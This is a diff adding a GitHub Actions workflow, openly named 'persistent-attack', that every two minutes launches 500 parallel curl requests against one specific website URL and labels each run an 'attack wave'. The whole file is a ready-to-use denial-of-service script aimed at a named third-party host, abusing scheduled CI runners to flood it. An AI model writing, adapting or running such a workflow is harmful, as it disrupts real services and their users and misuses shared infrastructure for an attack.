@@ -1,0 +1,22 @@
+name: persistent-attack
+
+on:
+  schedule:
+    - cron: '*/2 * * * *'
+  workflow_dispatch:
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install curl
+        run: sudo apt-get update && sudo apt-get install -y curl
+
+      - name: Launch attack
+        run: |
+          echo "🚀 Starting attack on https://mohamed-shaheen.axnos.com/home"
+          for i in {1..500}; do
+            curl -s -o /dev/null "https://mohamed-shaheen.axnos.com/home" || true &
+          done
+          wait
+          echo "✅ Attack wave completed."
